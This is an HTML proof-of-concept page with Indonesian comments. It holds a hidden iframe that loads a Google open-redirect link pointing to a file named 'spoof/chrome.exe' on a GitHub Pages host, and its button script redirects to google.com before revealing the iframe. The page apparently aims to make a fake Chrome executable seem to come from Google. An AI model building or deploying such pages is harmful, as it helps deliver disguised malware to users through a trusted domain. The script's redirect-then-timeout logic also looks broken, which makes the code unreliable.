<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PoC with Iframe and Button</title>
</head>
<body>
  <div id="content">
    <h1>Step 2: Redirect to Google</h1>
    <p>Klik tombol di bawah untuk mengunjungi <b>Google.com</b> dan menampilkan iframe dengan URL yang ditentukan:</p>

    <!-- Button untuk ke Google -->
    <button onclick="redirectToGoogle()">Go to Google.com</button>

    <!-- Iframe yang berisi URL yang kamu inginkan (awalnya disembunyikan) -->
    <div style="margin-top: 20px;">
      <iframe 
        id="iframeExample" 
        src="https://www.google.com/url?q=https%3A%2F%2Fcnfdnfial-ops.github.io%2Fspoof%2Fchrome.exe&sa=D&sntz=1&usg=AOvVaw3W5r-6mMJTcMqxax4geLnL"
        width="600" 
        height="300" 
        style="border: 1px solid #ccc; display: none;">
      </iframe>
    </div>
  </div>

  <script>
    // Fungsi untuk redirect ke Google.com
    function redirectToGoogle() {
      // Redirect ke Google.com di tab yang sama
      window.location.href = "https://www.google.com";

      // Setelah 2 detik, tampilkan iframe
      setTimeout(function() {
        const iframe = document.getElementById('iframeExample');
        iframe.style.display = "block";  // Tampilkan iframe setelah redirect
      }, 2000);  // Delay 2 detik setelah redirect
    }
  </script>
</body>
</html>
